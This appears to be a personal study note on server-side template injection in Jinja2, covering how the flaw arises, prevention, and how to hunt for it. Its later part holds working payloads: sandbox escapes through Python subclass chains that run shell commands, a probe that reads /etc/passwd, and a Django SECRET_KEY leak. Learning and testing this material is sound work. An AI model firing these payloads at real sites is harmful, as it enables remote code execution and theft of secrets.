### what && why
 *Template engines* are a type of software used to determine the appearance of a web page. *ssti* is an attack against this engines 
 - template engines combine application data with web templates to produce web pages. 
 - These web templates, written in template languages such as Jinja
 - Together, web templates and template engines allow developers to separate server-side application logic and client-side presentation code during web development.
 Jinja2  `example.jinja`
 ```python
<html>
	<body>
	<h1>{{ list_title }}</h1> 
	<h2>{{ list_description }}</h2>
	{% for item in item_list %} 
		{{ item }} 
		{% if not loop.last %},{% endif %} 
	{% endfor %} 
	</body>
</html>
```
above code contains special syntax to indicate content that the template engine should interpret as template code. In Jinja, any code surrounded by `{{ }}` is interpreted as a Python *expression*( var or fun return a value), and code surrounded `{% %}` should be interpreted as a Python *statement*(doesn’t return value, but control *expression*s).
following piece of Python code reads the template file from `example.jinja` and generates an HTML by place the provided values in place. 
```python
from jinja2 import Template 
with open('example.jinja') as f:
	tmpl = Template(f.read())
	print(tmpl.rander(
		list_title = "List 1", 
		list_description = "Here are the contents of List 1", 
		item_list =["nust a temp string","nust a temp string","nust a temp string"]
	))
```
above code is save cause user can't send input, also following code is save cause the developer separate between template code and user input  
```python
from jinja2 import Template 
with open('example.jinja') as f:
	tmpl = Template(f.read())
	print(tmpl.rander(
		list_title = user_input.title, 
		list_description = user_input.disc, 
		item_list =user_input.items
	))
```
SSTI happened when the developer mixed the user input with the template code without sanitize user input. the template engine can’t determine where a piece of user-supplied data ends and where the template logic starts, the template engine will mistake user input for template code. 
```python
from jinja2 import Template 
tmpl = Template(" <html><h1>The user's name is: " + user_input + "</h1></html>")
print(tmpl.render())
```
### Prevention  
-  regularly patching and updating the frameworks
- use sandbox environments to remove potentially dangerous modules, functions, making user-submitted templates safer to evaluate
- Implement an allowlist for allowed attributes in templates to prevent the kind of RCE exploit
-  return a generic error page to the user.
- sanitize user input before embedding it into web templates
### hunt for it
1. Look for User-Input Locations
	1. URL paths, parameters, fragments, HTTP request headers and body, file uploads
2. Detect Template Injection by Submitting Test Payloads
	1. `{{1+ax}}${1+bx}<%1+abx%>[abcxx]` look for application error
	2. some apps generate a generic error so u need to test it until u find the correct output, which not always returned in same page
	   `${7*7}` works for the FreeMarker and Thymeleaf Java templates; 
	   `{{7*7}}` works for PHP templates such as Smarty or Twig, and Python templates like Jinja2; and `<%= 7*7 %>` works for the ERB template
1. Determine the Template Engine in Use in order to escalate the attack
#### Escalating the Attack
Being able to execute system commands is extremely valuable for the attacker because it might allow them to read sensitive system files like customer data and source code files, update system configurations, escalate their privileges on the system,[[RCE]] ,and attack other machines on the network
- Searching for System Access via Python Code most of that u find a Sandbox => `{{__import__('os').system('ls')}}
- Escaping the Sandbox by Using Python Built-in Functions
	1. (as Jinja not allow us to `import os`, so we need to use what we have such : `'<class 'warnings.catch_warnings'>'`, `<class 'subprocess.Popen'>` or any class that import `sys` or `os` for us)
	2. list all classes available to use on object `().__class__.__base__.__subclasses__()` an we have the list, by using ctl+f we can find the index of `'<class 'warnings.catch_warnings'>'` -> **index:186** ,and `<class 'subprocess.Popen'>` -> **index:414**
    > 	we can use whatever we wont in the place of () such empty string '' as every thing in python is an object

	1. after we known the index we can access `sys module` that imported on `warnings.catch_warnings` class, get `os` module and, run commands using `popen` fun `<get_class>.__init__.__globals__['sys'].modules['os'].popen(<cmd>).read()`
	2. collect all `{{().__class__.__base__.__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}`
	or u can use if statement
	```python
	{% for x in [].__class__.__bases__[0].__subclasses__() %} 
	{% if 'catch_warnings' in x.__name__ %} 
	{{x()._module.__builtins__['__import__']('os').system('ls')}} 
	{%endif%} 
	{%endfor%}
	```
	Different template engines require different escalation techniques more from  [CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)[HackTricks](https://book.hacktricks.xyz/misc/basic-python/ bypass-python-sandboxes/),[Programmer Help](https://programmer.help/blogs/python-sandbox-escape.html) 
- Submitting Payloads for Testing, doesn’t harm the system you’re targeting, `cat /etc/passwd` , `touch SSTI_devMRT.txt`
- [[vulns checklist/Information Disclosure|Information Disclosure]] 
	- Django => `{{settings.SECRET_KEY}}`
- Automating 
	- [tplmap](https://github.com/epinna/tplmap/) **does not support every template engine**